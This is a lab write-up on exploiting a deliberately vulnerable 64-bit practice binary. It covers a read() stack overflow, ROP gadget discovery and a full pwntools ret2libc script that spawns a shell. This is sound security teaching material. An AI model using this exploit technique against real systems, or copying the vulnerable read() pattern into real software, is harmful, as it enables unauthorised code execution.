Before we look at the binary's code, we should see if the binary has any binary hardening mitigations. These can make it significantly harder to pwn the binary. We can do this using checksec from pwntools.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ pwn checksec b6_64
[*] '/Hackery/escape/buf_ovf/b6_64/b6_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

As you can see there, it is al 64-bit binary with NX enabled. NX stands for non-executable stack which means that anywhere that a user can write to cannot be executed as code. This means that we can no longer push shellcode onto the stack, and then execute it. So let's look at the code...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ cat b6_64.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void nothing()
{
  char* buf0[50];
  read(STDIN_FILENO, buf0, 450);
}

int main()
{
  printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
  nothing();
}
```

So looking at the code, we see a couple of things. The first is that this time our buffer overflow is limited to just 450 characters because of the use of read(). Since this binary is using read, that means when we push "\x00" to the stack (because 64 bit C addresses hhave lots of those) it will continue reading it since it is a null byte. If it was fgets, it would just stop reading input. What we can do is we can get the address of the system function from the libc (since it includes the stdlib.c), along with the address of the string "/bin/sh" (which is usually somewhere in libc) and effectivley get a shell. The first thing we will need to do is find the offset to the rip function.

```
gdb-peda$ disas nothing
Dump of assembler code for function nothing:
   0x0000000000400536 <+0>: push   rbp
   0x0000000000400537 <+1>: mov    rbp,rsp
   0x000000000040053a <+4>: sub    rsp,0x190
   0x0000000000400541 <+11>:  lea    rax,[rbp-0x190]
   0x0000000000400548 <+18>:  mov    edx,0x1c2
   0x000000000040054d <+23>:  mov    rsi,rax
   0x0000000000400550 <+26>:  mov    edi,0x0
   0x0000000000400555 <+31>:  call   0x400410 <read@plt>
   0x000000000040055a <+36>:  nop
   0x000000000040055b <+37>:  leave  
   0x000000000040055c <+38>:  ret    
End of assembler dump.
gdb-peda$ b *nothing+36
Breakpoint 1 at 0x40055a
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b6_64/b6_64 
If you do not get back to your research now, we will have to implement corrective solutions.
75395128
```

One wall of text later...

```
Breakpoint 1, 0x000000000040055a in nothing ()
gdb-peda$ x/s $rbp-0x190
0x7fffffffdcc0: "75395128\n"
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x40055a in nothing; saved rip = 0x400575
 called by frame at 0x7fffffffde70
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b9a177 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7ffff7a53390 <__libc_system>
```

And onto the quest for the holy grail

```
0x7fffffffde58 - 0x7fffffffdcc0 = 408
```

So we the offset between the start of our input and the rip register is 408. We also have the system() address from libc, which is 0x7ffff7a53390. We also have the address of the string "/bin/sh" from libc which is 0x7ffff7b9a177. There is still one more piece we need for the exploit. With this binary, the argument is passed to the function via the registers instead of just being on the stack. This means that we will have to use Return Oriented Programming (ROP) to find a piece of assembly code (referred to as a gadget) that will pop an argument off of the stack and into a register for the system call to read. All the ROP gadget is, is it is a piece of assembly code already somewhere in the function that we will call. The specifi register we should be looking for are rdi, or it's 32 bit counterpart edi. Reason for this being is that should be the first place a function argument is stored. To find it, i will be using a tool called ROPGadget. If you are running the vm I made, it should already be installed. If not, here is the link to the github page.

https://github.com/JonathanSalwan/ROPgadget

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ ROPgadget --binary b6_64 | grep di
0x000000000040048d : je 0x4004a8 ; pop rbp ; mov edi, 0x6009f0 ; jmp rax
0x00000000004004db : je 0x4004f0 ; pop rbp ; mov edi, 0x6009f0 ; jmp rax
0x0000000000400723 : jmp qword ptr [rdi]
0x0000000000400490 : mov edi, 0x6009f0 ; jmp rax
0x000000000040048f : pop rbp ; mov edi, 0x6009f0 ; jmp rax
0x00000000004005e3 : pop rdi ; ret
```

So we can see at the very last line, we have code that will pop a value off the stack and into the rdi register, then return. This will pop "/bin/sh" off the stack and into the register, then just continue running code. So our exploit will look like this.

```
payload = offset + gadget + bin_sh + system
```

So as you can see, when the nothing() function returns, it will execut our rop gadget will we pop the next thing off the stack (/bin/sh) into the rdi register, then it will run system. Now here is the python script that will do all of it.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ cat exploit.py 
#Import Pwn Tools
from pwn import *

#Establish the target
target = process("./b6_64")

#Recieve the first line, so we can reach the read call
print target.recvline()

#Establish the offset to reach the rip register
offset = "0"*408

#Rop Gadget to pop bin_sh into rdi
gadget = p64(0x00000000004005e3)

#Address of "/bin/sh" from libc
bin_sh = p64(0x7ffff7b9a177)

#Address of system function from libc
system = p64(0x7ffff7a53390)

#Constructing the paylaod
payload = offset + gadget + bin_sh + system

#Sending the payload
target.sendline(payload)

#Dropping to an interactive prompt
target.interactive()
```

Now let's test the exploit...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ python exploit.py 
[+] Starting local process './b6_64': Done
If you do not get back to your research now, we will have to implement corrective solutions.

[*] Switching to interactive mode
$ ls
b6_64  b6_64.c    core  exploit.py  out  peda-session-b6_64.txt  test.c
$ echo It Works!
It Works!
$ cat out
Someone has been researching security overriding methods. Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b6_64' stopped with exit code -11
[*] Got EOF while sending in interactive
```

And just like that, we pwned the binary.
